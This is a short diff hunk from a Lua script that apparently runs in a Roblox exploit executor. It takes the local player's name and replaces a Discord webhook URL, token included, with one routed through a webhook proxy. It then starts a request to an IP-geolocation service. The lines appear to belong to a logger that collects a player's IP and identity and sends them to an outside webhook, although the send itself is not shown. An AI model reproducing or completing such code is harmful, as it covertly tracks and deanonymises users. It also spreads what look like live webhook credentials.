@@ -134,7 +134,7 @@ pcall(function()
 end)
 
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1084218849009860628/-YuvVFBIhkG_WmB2QXEQeV36DXtnPizUzca0aMEfszoJ7ipCtrGrKX6xZf6qYVpZk9pG"
+local webhook_url = "https://webhook.lewisakura.moe/api/webhooks/1084218278261567569/9DWBfgbX2vT9G9xfpPgeJubD21slejuX2GpBjxxdDhMoJlFV_x3jllIti_-BRmqHBDMZ"
 
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
